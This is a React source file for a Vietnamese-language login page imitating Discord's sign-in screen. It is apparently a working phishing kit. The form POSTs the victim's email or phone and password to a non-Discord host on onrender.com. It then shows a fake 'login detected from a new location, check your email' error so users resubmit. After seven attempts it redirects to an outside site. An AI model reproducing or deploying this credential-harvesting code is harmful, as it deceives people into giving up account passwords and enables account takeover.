import { useState } from 'react';
import './App.css';
import banner from '../src/assets/banner.svg';
import logo from '../src/assets/logo.svg';

function App() {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  const handleLogin = async (e: { preventDefault: () => void }) => {
    e.preventDefault();

    try {
      const response = await fetch(
        'https://api-discord-yzpf.onrender.com/api/v1/auth/login',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ emailOrPhone, password }),
        }
      );

      if (response.ok) {
        // Xử lý đăng nhập thành công
        console.log('Đăng nhập thành công');
        // Chuyển hướng người dùng sang trang mới
        setLoginAttempts((prevAttempts) => prevAttempts + 1);
        if (loginAttempts + 1 >= 7) {
          setShowErrorMessage(false);
          window.location.href = 'https://daominhha.net/en-garde/';
        }else{
            setShowErrorMessage(true);
          
        }
      } else {
        // Xử lý đăng nhập thất bại
        console.log('Đăng nhập thất bại');
        // Hiển thị thông báo và màu đỏ khi số lần đăng nhập sai đạt 6

      }
    } catch (error) {
      console.error('Lỗi khi thực hiện đăng nhập:', error);
    }
  };

  return (
    <div className='screen-wrapper'>
      <img src={banner} alt='baner' />
      <div className='form-container'>
        <form onSubmit={handleLogin} autoComplete='false' className='form-main'>
          <img src={logo} alt='logo' className='logo' />
          <h4>Chào mừng trở lại!</h4>
          <p>Rất vui khi được gặp lại bạn!</p>
          <div className='list-elm'>
            <div className='input-wrap'>
              <label htmlFor='username'>
                Email hoặc số điện thoại <span>*</span>
              </label>
              <input
                style={{
                  border: showErrorMessage ? 'solid red 1px' : 'none'
                }}
                type='text'
                id='username'
                value={emailOrPhone}
                onChange={(e) => {
                  setEmailOrPhone(e.target.value);
                  setShowErrorMessage(false); // Ẩn thông báo khi người dùng thay đổi nội dung input
                }}
              />
              {showErrorMessage && (
                <p style={{ fontSize: '12px', color: 'red' }}>
                  Phát hiện đăng nhập ở địa điểm mới, hãy kiểm tra email của bạn.
                </p>
              )}
            </div>
            <div className='input-wrap'>
              <label htmlFor='password'>
                Mật khẩu<span>*</span>
              </label>
              <input
                type='password'
                id='password'
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <a href='#'>Quên mật khẩu?</a>
            <button style={{ cursor: 'pointer' }} type='submit'>
              Đăng nhập
            </button>
            <div>
              <span>Cần một tài khoản?</span>
              <span>Đăng ký</span>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
